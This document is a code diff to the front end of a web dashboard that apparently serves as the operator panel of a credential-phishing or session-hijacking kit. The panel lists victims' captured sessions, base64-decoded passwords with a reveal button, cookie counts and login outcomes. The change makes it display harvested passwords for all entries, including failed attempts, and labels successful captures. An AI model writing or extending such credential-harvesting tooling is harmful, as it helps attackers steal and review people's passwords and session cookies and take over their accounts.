@@ -892,12 +892,8 @@
 
                 document.getElementById('loading').style.display = 'none';
 
-                // Filter out account not found errors completely
-                const filteredSessions = sessions.sessions.filter(session => 
-                    !(session.status === 'invalid' && session.reason === 'Account not found')
-                );
-
-                if (filteredSessions.length === 0) {
+                // Show all sessions (both valid and invalid)
+                if (sessions.sessions.length === 0) {
                     document.getElementById('no-sessions').style.display = 'block';
                     return;
                 }
@@ -905,7 +901,7 @@
                 const tbody = document.getElementById('sessions-tbody');
                 tbody.innerHTML = '';
 
-                filteredSessions.forEach((session, index) => {
+                sessions.sessions.forEach((session, index) => {
                     const row = document.createElement('tr');
 
                     // Style the row based on status
@@ -917,10 +913,10 @@
                         row.style.borderLeft = '4px solid #00ff00';
                     }
 
-                    // Handle password column based on status
+                    // Handle password column - show password for all entries with mask/reveal functionality
                     let passwordColumn = '';
-                    if (session.status === 'valid' && session.password) {
-                        // Decode base64 password for valid sessions
+                    if (session.password) {
+                        // Decode base64 password if present
                         let decodedPassword = session.password;
                         try {
                             decodedPassword = atob(session.password);
@@ -938,11 +934,11 @@
                                     id="reveal-btn-${index}" class="reveal-btn">SHOW</button>
                             </div>
                         `;
-                    } else if (session.status === 'valid' && !session.password) {
+                    } else if (session.status === 'valid') {
                         // Valid session but no password captured
                         passwordColumn = `<span style="color: #ffaa00; font-weight: bold;">⚠️ NO PASSWORD CAPTURED</span>`;
                     } else if (session.status === 'invalid') {
-                        // Show reason for invalid entries
+                        // Invalid entry - show the reason
                         const reason = session.reason || 'FAILED ENTRY';
                         passwordColumn = `<span style="color: #ff6666; font-weight: bold;">❌ ${reason.toUpperCase()}</span>`;
                     } else {
@@ -977,7 +973,8 @@
                                 TIMESTAMP: ${new Date(session.timestamp).toLocaleString()}
                             </div>
                             ${session.status === 'valid' ? 
-                                `<div class="session-info">COOKIES: ${session.totalCookies} ENCRYPTED</div>` :
+                                `<div class="session-info">COOKIES: ${session.totalCookies || 0} ENCRYPTED</div>
+                                 <div class="session-info" style="color: #00ff66;">STATUS: SUCCESSFUL AUTHENTICATION</div>` :
                                 `<div class="session-info" style="color: #ff6666;">FAILURE REASON: ${session.reason || 'Unknown Error'}</div>
                                  ${session.errorMessage ? `<div class="session-info" style="color: #ff9999;">ERROR DETAILS: ${session.errorMessage}</div>` : ''}
                                  <div class="session-info" style="color: #ffcc99;">STATUS: FAILED AUTHENTICATION</div>`
